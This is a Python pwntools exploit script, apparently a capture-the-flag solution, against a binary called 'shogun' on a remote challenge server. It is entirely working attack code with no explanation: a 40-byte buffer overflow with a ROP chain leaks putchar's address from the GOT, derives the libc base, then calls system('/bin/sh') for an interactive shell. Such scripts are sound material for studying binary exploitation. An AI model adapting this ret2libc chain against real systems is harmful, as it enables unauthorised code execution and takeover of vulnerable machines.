#!/usr/bin/env python3 
from pwn import *

#r = process(["./ld-2.31.so","./shogun"], env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("pwn.chall.pwnoh.io", 13373)
e = ELF("./shogun")

r.sendlineafter(b"a disturbance. ", b"Look around.")


rop = ROP(e)

gadgets = [
    rop.find_gadget(["pop rdi", "ret"]).address, 
    e.got['putchar'],
    rop.find_gadget(["ret"]).address, 
    e.symbols['scroll'],
    e.symbols['_start'],
]

payload = b"".join(p64(gadget) for gadget in gadgets)
payload = b"A" * 40 + payload
print(payload)

info(f"sending stage 1..")
r.sendafter(b"He attacks you! ", payload)

sleep(5)
leak = u64(r.recv(6).ljust(8, b"\x00"))
info(f"putchar leak: {hex(leak)}")

r.sendlineafter(b"a disturbance. ", b"Look around.")

##################
e = ELF("./libc-2.31.so")
e.address = leak - e.symbols['putchar']

info(f"libc_base: {hex(e.address)}")

gadgets = [
    rop.find_gadget(["pop rdi", "ret"]).address, 
    next(e.search(b"/bin/sh\x00")),
    rop.find_gadget(["ret"]).address, 
    e.symbols['system']
]

payload = b"".join(p64(gadget) for gadget in gadgets)
payload = b"A" * 40 + payload
print(payload)


pause()
info(f"sending stage 2..")
r.sendlineafter(b"He attacks you! ", payload)

r.interactive()